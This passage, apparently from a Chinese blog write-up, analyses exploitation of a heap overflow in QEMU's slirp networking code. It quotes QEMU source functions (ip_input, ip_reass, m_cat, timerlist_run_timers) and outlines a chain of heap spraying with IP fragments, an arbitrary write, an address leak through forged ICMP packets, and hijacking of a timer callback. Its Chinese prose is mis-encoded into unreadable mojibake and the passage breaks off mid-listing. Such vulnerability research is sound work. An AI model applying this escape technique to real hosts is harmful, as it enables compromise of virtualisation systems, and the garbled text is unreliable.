ti-&gt;ti_len &lt;= sbspace(&amp;so-&gt;so_rcv)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * this is a pure, in-sequence data packet</span><br><span class="hljs-comment"> * with nothing on the reassembly queue and</span><br><span class="hljs-comment"> * we have enough buffer space to take it.</span><br><span class="hljs-comment"> */</span><br>tp-&gt;rcv_nxt += ti-&gt;ti_len;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Add data to socket buffer.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (so-&gt;so_emu) &#123;<br><span class="hljs-keyword">if</span> (tcp_emu(so,m)) sbappend(so, m);<br>&#125; <span class="hljs-keyword">else</span><br>sbappend(so, m);<br></code></pre></td></tr></table></figure><p>â€‹                                               </p><p>è‡ªå·±ä¹Ÿæµ‹è¯•äº†ä¸€ä¸‹æ•°æ®ä¸­å­˜åœ¨<code>\r\n</code>çš„è¿™ç§æƒ…å†µ</p><p>åœ¨tcp_emuå‡½æ•°ç»“æŸæ—¶çš„å‚æ•°å¦‚ä¸‹ï¼š</p><img src="/img/20/Screenshot 2023-10-09 105434.png" style="zoom:67%;" /><p>å¹¶ä¸”ç›‘å¬çš„ç«¯å£ä¹Ÿä¼šå‡ºç°ç›¸åº”çš„å€¼ï¼š</p><img src="/img/20/Screenshot 2023-10-09 105736.png" style="zoom:80%;" /><p>ä¸‹æ¬¡å†è¿›å…¥tcp_inputä¸­çš„åˆ¤æ–­æ—¶ï¼š</p><img src="/img/20/Screenshot 2023-10-09 105509.png" style="zoom: 67%;" /><p>â€‹                                     </p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æ¥ä¸‹æ¥æ“ä½œéƒ½ä¸»è¦ä¸IPæ•°æ®æŠ¥æ–‡çš„è¿™äº›å­—æ®µæœ‰å…³ï¼š</p><ul><li><strong>Identification ï¼š</strong>å¯¹åº”Cè¯­è¨€ipç»“æ„ä½“çš„ip_idã€‚å½“ä¸€ä¸ªIPæ•°æ®åŒ…ä¼ è¾“è¿‡ç¨‹ä¸­ç»è¿‡ä¸€ä¸ªå…·æœ‰è¾ƒå°æœ€å¤§ä¼ è¾“å•å…ƒï¼ˆMTUï¼‰çš„ç½‘ç»œé“¾è·¯æ—¶ï¼Œè¯¥æ•°æ®åŒ…å¯èƒ½ä¼šè¢«åˆ†å‰²æˆå¤šä¸ªç‰‡æ®µï¼Œä»¥é€‚åº”è¾ƒå°çš„ç½‘ç»œé“¾è·¯ã€‚è¯¥æ ‡å¿—åœ¨è¿™ç§æƒ…å†µä¸‹ç”¨äºæ ‡è¯†åŸå§‹æ•°æ®åŒ…çš„å„ä¸ªç‰‡æ®µã€‚æ¯ä¸ªç‰‡æ®µå°†å…·æœ‰ç›¸åŒçš„å€¼ï¼Œä»¥ä¾¿æ¥æ”¶ç«¯çŸ¥é“å®ƒä»¬å±äºåŒä¸€ä¸ªæ•°æ®åŒ…ã€‚</li><li><strong>DF ï¼š</strong> å¦‚æœDFæ ‡å¿—è¢«è®¾ç½®ä¸º1ï¼Œè¡¨ç¤ºæ•°æ®åŒ…ç¦æ­¢åˆ†ç‰‡ã€‚å¦‚æœæ•°æ®åŒ…å¤ªå¤§æ— æ³•åœ¨ç½‘ç»œä¸­ä¼ è¾“ï¼Œå®ƒå°†è¢«ä¸¢å¼ƒã€‚</li><li><strong>MF ï¼š</strong> å¦‚æœMFæ ‡å¿—è¢«è®¾ç½®ä¸º1ï¼Œè¡¨ç¤ºè¿™ä¸ªæ•°æ®åŒ…æ˜¯åˆ†ç‰‡çš„ä¸€éƒ¨åˆ†ï¼Œè¿˜æœ‰æ›´å¤šçš„ç‰‡æ®µã€‚å¦‚æœMFæ ‡å¿—ä¸º0ï¼Œè¡¨ç¤ºè¿™æ˜¯æœ€åä¸€ä¸ªç‰‡æ®µã€‚</li><li><strong>Fragmentation offset (13 bits)ï¼š</strong>è¡¨ç¤ºæ­¤åŒ…æ•°æ®åœ¨é‡ç»„æ—¶çš„åç§»ï¼Œå’ŒDFã€MFéƒ½åœ¨Cè¯­è¨€ipç»“æ„ä½“çš„ip_offä¸­ã€‚</li></ul><h3 id="mallocåŸè¯­"><a href="#mallocåŸè¯­" class="headerlink" title="mallocåŸè¯­"></a>mallocåŸè¯­</h3><p>ç”±äºæ˜¯å †æº¢å‡ºæ¼æ´ï¼Œä¹Ÿå°±éœ€è¦çŸ¥é“<code>so_rcv-&gt;sb_wptr</code>å †å—åé¢çš„æ•°æ®æ˜¯å±äºå“ªé‡Œçš„ï¼Œè¿™æ ·æº¢å‡ºåè¦†ç›–çš„å€¼æ‰èƒ½è¿›è¡Œæœ‰æ•ˆæ”»å‡»ã€‚ä½†æ˜¯æ¯æ¬¡å¯åŠ¨è™šæ‹Ÿæœº<code>so_rcv-&gt;sb_wptr</code>è¿™ä¸ªå †å—éƒ½æ˜¯éšæœºåˆ†é…çš„ï¼Œè¿™é‡Œéœ€è¦ä½¿ç”¨mallocåŸè¯­å»å®ç°å †å–·ï¼Œè®©so_rcv-&gt;sb_wpträ½¿ç”¨top chunkï¼ˆè¶…çº§å¤§çš„largebinä¹Ÿè¡Œï¼‰å»åˆ†é…ï¼Œè®©so_rcv-&gt;sb_wptråå †å—æ’å¸ƒå®Œå…¨å¯ä»¥æ“çºµã€‚</p><p>åœ¨<a href="https://elixir.bootlin.com/qemu/v3.1.0/source/slirp/ip_input.c#L76">ip_inputå‡½æ•°</a>ä¸­ï¼Œè®¾ç½®ä¸€ä¸ªIPåŒ…DF&#x3D;0   MF&#x3D;1ï¼Œè¡¨ç¤ºå…¶å¯ä»¥åˆ†ç‰‡å¹¶ä¸”å±äºæ•°æ®åŒ…çš„ä¸€éƒ¨åˆ†ï¼Œå‘é€åè¿›å…¥ip_inputå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡<code>ip-&gt;ip_off &amp;~ IP_DF</code>åˆ¤æ–­ï¼Œæ¥ä¸‹æ¥ä¼šåœ¨é“¾è¡¨ä¸­è·å–å…¶å®ƒIPåŒ…ï¼Œåˆ¤æ–­ip_idã€ip_src.s_addr ã€ip-&gt;ip_dst.s_addrå’Œip_på¯»æ‰¾ç›¸åŒçš„IPåˆ†æ®µåŒ…ï¼Œæ²¡æœ‰æ‰¾åˆ°fp &#x3D; NULLï¼Œè¿›å…¥ip_reasså‡½æ•°åå¯ä»¥æ»¡è¶³<code>fp == NULL</code>ï¼Œç»§ç»­è¿›å…¥m_getå‡½æ•°å°±å¯ä»¥åˆ†é…ä¸€ä¸ª0x670å¤§å°çš„å †å—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">ip_input</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mbuf *m)</span><br>&#123;<br>â€¦â€¦â€¦â€¦<br>â€¦â€¦â€¦â€¦<br><span class="hljs-keyword">if</span> (ip-&gt;ip_off &amp;~ IP_DF) &#123;<br>  <span class="hljs-keyword">register</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipq</span> *<span class="hljs-title">fp</span>;</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">qlink</span> *<span class="hljs-title">l</span>;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Look for queue of fragments</span><br><span class="hljs-comment"> * of this datagram.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">for</span> (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link;<br>     l = l-&gt;next) &#123;<br>            fp = container_of(l, <span class="hljs-keyword">struct</span> ipq, ip_link);<br>            <span class="hljs-keyword">if</span> (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp;<br>                    ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp;<br>                    ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp;<br>                    ip-&gt;ip_p == fp-&gt;ipq_p)<br>    <span class="hljs-keyword">goto</span> found;<br>        &#125;<br>        fp = <span class="hljs-literal">NULL</span>;<br>found:<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Adjust ip_len to not reflect header,</span><br><span class="hljs-comment"> * set ip_mff if more fragments are expected,</span><br><span class="hljs-comment"> * convert offset of this to bytes.</span><br><span class="hljs-comment"> */</span><br>ip-&gt;ip_len -= hlen;<br><span class="hljs-keyword">if</span> (ip-&gt;ip_off &amp; IP_MF)<br>  ip-&gt;ip_tos |= <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>  ip-&gt;ip_tos &amp;= ~<span class="hljs-number">1</span>;<br><br>ip-&gt;ip_off &lt;&lt;= <span class="hljs-number">3</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If datagram marked as having more fragments</span><br><span class="hljs-comment"> * or if this is not the first fragment,</span><br><span class="hljs-comment"> * attempt reassembly; if it succeeds, proceed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (ip-&gt;ip_tos &amp; <span class="hljs-number">1</span> || ip-&gt;ip_off) &#123;<br>ip = ip_reass(slirp, ip, fp);<br>                        <span class="hljs-keyword">if</span> (ip == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span>;<br>m = dtom(slirp, ip);<br>&#125; <span class="hljs-keyword">else</span><br>â€¦â€¦â€¦â€¦<br>â€¦â€¦â€¦â€¦<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> ip *<br>ip_reass(Slirp *slirp, <span class="hljs-keyword">struct</span> ip *ip, <span class="hljs-keyword">struct</span> ipq *fp)<br>&#123;<br>â€¦â€¦â€¦â€¦<br>â€¦â€¦â€¦â€¦<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * If first fragment to arrive, create a reassembly queue.</span><br><span class="hljs-comment">     */</span><br>        <span class="hljs-keyword">if</span> (fp == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-keyword">struct</span> mbuf *t = m_get(slirp)<br>        &#125;<br>â€¦â€¦â€¦â€¦<br>â€¦â€¦â€¦â€¦<br>&#125;<br><br><br><span class="hljs-keyword">struct</span> mbuf *<br>m_get(Slirp *slirp)<br>&#123;<br>    <span class="hljs-keyword">register</span> <span class="hljs-keyword">struct</span> mbuf *m;<br>    <span class="hljs-type">int</span> flags = <span class="hljs-number">0</span>;<br><br>    DEBUG_CALL(<span class="hljs-string">&quot;m_get&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (slirp-&gt;m_freelist.qh_link == &amp;slirp-&gt;m_freelist) &#123;<br>                m = g_malloc(SLIRP_MSIZE);<br>â€¦â€¦â€¦â€¦<br>â€¦â€¦â€¦â€¦<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹äºmallocåŸè¯­æœ€æµ…æ˜¾çš„ç†è§£å°±æ˜¯å‘é€ä¸åŒçš„ï¼ˆip_idã€ip_src.s_addr ã€ip-&gt;ip_dst.s_addrè¿™äº›å€¼ä¸å®Œå…¨ç›¸åŒå³å¯ï¼‰æ•°æ®åŒ…ï¼Œå¹¶ä¸”åˆ†ç‰‡ä¸ºå¤šä¸ªIPåŒ…ï¼Œä½†æ˜¯æ¯ç§æ•°æ®åŒ…åˆ†ç‰‡çš„IPåŒ…å¹¶ä¸ä¸€æ¬¡æ€§å‘é€å®Œï¼Œè®©å…¶ä¸€ç›´ç­‰å¾…æœ€åä¸€ä¸ªIPåŒ…ï¼Œè¿™æ ·æ¯æ¬¡å‘é€è¿™ç§IPåŒ…åˆ†é…å†…å­˜åå°±ä¼šä¸€ç›´å ç”¨å†…å­˜ï¼Œå¹¶ä¸ä¼šå¯¹å…¶é‡Šæ”¾ã€‚</p><h3 id="ä»»æ„å†™"><a href="#ä»»æ„å†™" class="headerlink" title="ä»»æ„å†™"></a>ä»»æ„å†™</h3><p>åŒæ ·ä¹Ÿæ˜¯åœ¨<a href="https://elixir.bootlin.com/qemu/v3.1.0/source/slirp/ip_input.c#L76">ip_inputå‡½æ•°</a>ä¸­ï¼Œå…ˆä½¿ç”¨mallocåŸè¯­å‘é€ä¸€ä¸ªIPåŒ…ï¼Œç„¶åè®¾ç½®ä¸€ä¸ªä¸å‘é€è¿‡çš„IPåŒ…çš„ip_idã€ip_src.s_addrå’Œip-&gt;ip_dst.s_addrç›¸åŒçš„IPåŒ…ï¼Œå¹¶ä¸”è¿™ä¸ªIPåŒ…DF&#x3D;0   MF&#x3D;0  Fragmentation offsetå­˜åœ¨å€¼ï¼Œè¡¨ç¤ºå…¶å¯ä»¥åˆ†ç‰‡å¹¶ä¸”å±äºæ•°æ®åŒ…çš„æœ€åä¸€ä¸ªï¼›è¿›å…¥ip_inputå‡½æ•°åå¯ä»¥é€šè¿‡<code>ip-&gt;ip_off &amp;~ IP_DF</code>åˆ¤æ–­ï¼Œæ¥ä¸‹æ¥ä¼šåœ¨é“¾è¡¨ä¸­è·å–å…¶å®ƒIPåŒ…ï¼Œåˆ¤æ–­ip_idã€ip_src.s_addr ã€ip-&gt;ip_dst.s_addrå’Œip_pè¿™äº›å€¼ï¼Œå¾—åˆ°å…ˆå‰å‘é€è¿‡çš„IPåŒ…ï¼Œè¿›å…¥ip_reasså‡½æ•°åè°ƒç”¨m_catå‡½æ•°ï¼Œæ¥å®ç°å¯¹IPåŒ…æ•°æ®çš„åˆå¹¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">ip_input</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mbuf *m)</span><br>&#123;<br>â€¦â€¦â€¦â€¦<br>â€¦â€¦â€¦â€¦<br><span class="hljs-keyword">if</span> (ip-&gt;ip_off &amp;~ IP_DF) &#123;<br>  <span class="hljs-keyword">register</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipq</span> *<span class="hljs-title">fp</span>;</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">qlink</span> *<span class="hljs-title">l</span>;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Look for queue of fragments</span><br><span class="hljs-comment"> * of this datagram.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">for</span> (l = slirp-&gt;ipq.ip_link.next; l != &amp;slirp-&gt;ipq.ip_link;<br>     l = l-&gt;next) &#123;<br>            fp = container_of(l, <span class="hljs-keyword">struct</span> ipq, ip_link);<br>            <span class="hljs-keyword">if</span> (ip-&gt;ip_id == fp-&gt;ipq_id &amp;&amp;<br>                    ip-&gt;ip_src.s_addr == fp-&gt;ipq_src.s_addr &amp;&amp;<br>                    ip-&gt;ip_dst.s_addr == fp-&gt;ipq_dst.s_addr &amp;&amp;<br>                    ip-&gt;ip_p == fp-&gt;ipq_p)<br>    <span class="hljs-keyword">goto</span> found;<br>        &#125;<br>        fp = <span class="hljs-literal">NULL</span>;<br>found:<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Adjust ip_len to not reflect header,</span><br><span class="hljs-comment"> * set ip_mff if more fragments are expected,</span><br><span class="hljs-comment"> * convert offset of this to bytes.</span><br><span class="hljs-comment"> */</span><br>ip-&gt;ip_len -= hlen;<br><span class="hljs-keyword">if</span> (ip-&gt;ip_off &amp; IP_MF)<br>  ip-&gt;ip_tos |= <span class="hljs-number">1</span>;<br><span class="hljs-keyword">else</span><br>  ip-&gt;ip_tos &amp;= ~<span class="hljs-number">1</span>;<br><br>ip-&gt;ip_off &lt;&lt;= <span class="hljs-number">3</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If datagram marked as having more fragments</span><br><span class="hljs-comment"> * or if this is not the first fragment,</span><br><span class="hljs-comment"> * attempt reassembly; if it succeeds, proceed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (ip-&gt;ip_tos &amp; <span class="hljs-number">1</span> || ip-&gt;ip_off) &#123;<br>ip = ip_reass(slirp, ip, fp);<br>                        <span class="hljs-keyword">if</span> (ip == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span>;<br>m = dtom(slirp, ip);<br>&#125; <span class="hljs-keyword">else</span><br>â€¦â€¦â€¦â€¦<br>â€¦â€¦â€¦â€¦<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> ip *<br>ip_reass(Slirp *slirp, <span class="hljs-keyword">struct</span> ip *ip, <span class="hljs-keyword">struct</span> ipq *fp)<br>&#123;<br>    <span class="hljs-keyword">register</span> <span class="hljs-keyword">struct</span> mbuf *m = dtom(slirp, ip);<br>    <span class="hljs-keyword">register</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipasfrag</span> *<span class="hljs-title">q</span>;</span><br>    <span class="hljs-type">int</span> hlen = ip-&gt;ip_hl &lt;&lt; <span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> i, next;<br>â€¦â€¦â€¦â€¦<br>â€¦â€¦â€¦â€¦<br><br>    q = fp-&gt;frag_link.next;<br>    m = dtom(slirp, q);<br><br>    q = (<span class="hljs-keyword">struct</span> ipasfrag *) q-&gt;ipf_next;<br>    <span class="hljs-keyword">while</span> (q != (<span class="hljs-keyword">struct</span> ipasfrag*)&amp;fp-&gt;frag_link) &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mbuf</span> *<span class="hljs-title">t</span> =</span> dtom(slirp, q);<br>      q = (<span class="hljs-keyword">struct</span> ipasfrag *) q-&gt;ipf_next;<br>      m_cat(m, t);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">m_cat</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mbuf *m, <span class="hljs-keyword">struct</span> mbuf *n)</span><br>&#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * If there&#x27;s no room, realloc</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (M_FREEROOM(m) &lt; n-&gt;m_len)<br>        m_inc(m, m-&gt;m_len + n-&gt;m_len);<br><br>    <span class="hljs-built_in">memcpy</span>(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len);<br>    m-&gt;m_len += n-&gt;m_len;<br><br>    m_free(n);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹äºä¸Šè¿°è¿‡ç¨‹æœ€æµ…æ˜¾çš„ç†è§£å°±æ˜¯ä¸€ä¸ªæ•°æ®åŒ…åˆ†ç‰‡å‘é€åï¼Œå½“æœ€åä¸€ä¸ªIPåŒ…ä¹Ÿå‘é€å®Œæˆåï¼Œå°±ä¼šå°†è¿™äº›IPåŒ…é‡æ–°ç»„åˆèµ·æ¥ã€‚</p><p>å †æº¢å‡ºè¦†ç›–ç¬¬ä¸€ä¸ªIPåŒ…çš„m_dataï¼Œå†å‘é€æœ€åä¸€ä¸ªIPåŒ…ï¼Œè¿›å…¥m_catå‡½æ•°åè°ƒç”¨<code>memcpy(m-&gt;m_data+m-&gt;m_len, n-&gt;m_data, n-&gt;m_len)</code>æ¥å®ç°å¯¹<code>m_data + m_len</code>è¿™ä¸ªåœ°å€çš„ä»»æ„å†™ã€‚</p><h3 id="ä¿¡æ¯æ³„æ¼"><a href="#ä¿¡æ¯æ³„æ¼" class="headerlink" title="ä¿¡æ¯æ³„æ¼"></a>ä¿¡æ¯æ³„æ¼</h3><p>ä¸ªäººæ„Ÿè§‰è¿™ä¸€æ­¥æ˜¯æœ€ä¸ºå·§å¦™çš„åœ°æ–¹ï¼Œåˆ©ç”¨ä¼ªé€ ICMPå“åº”è¯·æ±‚åŒ…ï¼Œä»å“åº”åº”ç­”åŒ…ä¸­æ³„æ¼ä¿¡æ¯ã€‚</p><p>å…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li>å‘é€MFæ ‡å¿—è®¾ç½®ä¸º1çš„IPåŒ…ï¼Œåˆ©ç”¨å †æº¢å‡ºå°†æ­¤IPåŒ…çš„m_dataçš„ä½ä½3ä½è¦†ç›–ï¼Œè¦†ç›–çš„å€¼å…·ä½“è·Ÿæœ¬åœ°å †ç¯å¢ƒä¸­å­˜åœ¨çš„qemuçš„åœ°å€ä¿¡æ¯æœ‰å…³ï¼Œè¿™ä¸ªå€¼è®¾ç½®åˆ°å…·æœ‰qemuåœ°å€ä¿¡æ¯çš„ä½åœ°å€å¤„ï¼›</li><li>ç„¶ååˆ©ç”¨ä»»æ„åœ°å€å†™å°†ä¼ªé€ çš„ICMPåŒ…å¤´å†™å…¥åˆ°è¯¥åœ°å€å¤„ï¼›</li><li>æ¥ç€æ˜¯ç»§ç»­å‘é€ä¸€ä¸ªIPåŒ…ï¼Œä¸è¿‡è¿™ä¸ªIPåŒ…å…·ä½“ä¸ºICMPåè®®çš„è¯·æ±‚åŒ…ï¼Œå¹¶å°†å…¶MFæ ‡å¿—è®¾ç½®ä¸º1ï¼Œä¹Ÿæ˜¯åˆ©ç”¨å †æº¢å‡ºå°†æ­¤IPåŒ…çš„m_dataçš„ä½ä½è¦†ç›–æˆä¼ªé€ çš„ICMPè¯·æ±‚åŒ…çš„ä½ç½®ï¼›</li><li>æœ€åå†å‘é€ä¸€ä¸ªMFä¸º0çš„ICMPåè®®çš„IPåŒ…ï¼ŒICMPåè®®çš„IPåŒ…é‡ç»„åï¼Œå“åº”è¯·æ±‚ICMPåŒ…çš„æ•°æ®å°±å˜æˆäº†ä¼ªé€ çš„ICMPè¯·æ±‚åŒ…ï¼Œç„¶åç­‰å¾…ICMPåº”ç­”åŒ…ï¼Œåœ¨åº”ç­”åŒ…ä¸­å¯ä»¥å¾—åˆ°ç¨‹åºåœ°å€ä»¥åŠå †åœ°å€ï¼Œå®ç°ä¿¡æ¯æ³„éœ²ã€‚</li></ol><p>â€‹                              </p><p>è‡ªå·±æœ¬åœ°å †ç¯å¢ƒä¸­å­˜åœ¨qemuçš„åœ°å€ä¿¡æ¯å†…å­˜å—å¦‚ä¸‹ï¼Œå°±åœ¨tcacheç»“æ„ä½“å¤´çš„åé¢ï¼š</p><img src="/img/20/Screenshot 2023-10-12 004330.png" style="zoom: 67%;" /><p>ç¬¬ä¸€æ¬¡ä¿®æ”¹çš„ä½3ä½å€¼ä¸º0x6e0ï¼Œè¿›è¡Œä»»æ„å†™æ—¶å°±æ˜¯å¯¹0x7f375c000ae0åœ°å€å¤„å†™å…¥ä¼ªé€ çš„ICMPåŒ…å¤´</p><img src="/img/20/Screenshot 2023-10-12 012105.png" style="zoom:80%;" /><p>ç¬¬äºŒæ¬¡ä¿®æ”¹çš„ä½3ä½å€¼ä¸º0xb02ï¼ŒICMPçš„åº”ç­”åŒ…å°±ä¼šå°†m_data åé¢ä¿¡æ¯æ³„æ¼å‡ºå»</p><img src="/img/20/Screenshot 2023-10-12 012125.png" style="zoom:80%;" /><p>â€‹</p><h3 id="ç¨‹åºæ‰§è¡Œæµæ§åˆ¶"><a href="#ç¨‹åºæ‰§è¡Œæµæ§åˆ¶" class="headerlink" title="ç¨‹åºæ‰§è¡Œæµæ§åˆ¶"></a>ç¨‹åºæ‰§è¡Œæµæ§åˆ¶</h3><p>åœ¨å †ä¸­ä¼ªé€ ä¸€ä¸ªQEMUTimerListç»“æ„ä½“å’ŒQEMUTimerç»“æ„ä½“ï¼Œé€šè¿‡ä»»æ„å†™å°†ä¼ªé€ çš„QEMUTimerListåœ°å€è¦†ç›–åˆ°qemuçš„å…¨å±€å˜é‡main_loop_tlgï¼Œç­‰expire_timeæ—¶é—´åˆ°ï¼Œå°†ä¼šæ‰§è¡ŒQEMUTimerç»“æ„ä½“ä¸­çš„cb(opaque)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">qemu_clock_run_timers</span><span class="hljs-params">(QEMUClockType type)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> timerlist_run_timers(main_loop_tlg.tl[type]);<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">timerlist_run_timers</span><span class="hljs-params">(QEMUTimerList *timer_list)</span><br>&#123;<br>    QEMUTimer *ts;<br>    <span class="hljs-type">int64_t</span> current_time;<br>    <span class="hljs-type">bool</span> progress = <span class="hljs-literal">false</span>;<br>    QEMUTimerCB *cb;<br>    <span class="hljs-type">void</span> *opaque;<br>â€¦â€¦â€¦â€¦<br>â€¦â€¦â€¦â€¦<br>    current_time = qemu_clock_get_ns(timer_list-&gt;clock-&gt;type);<br>    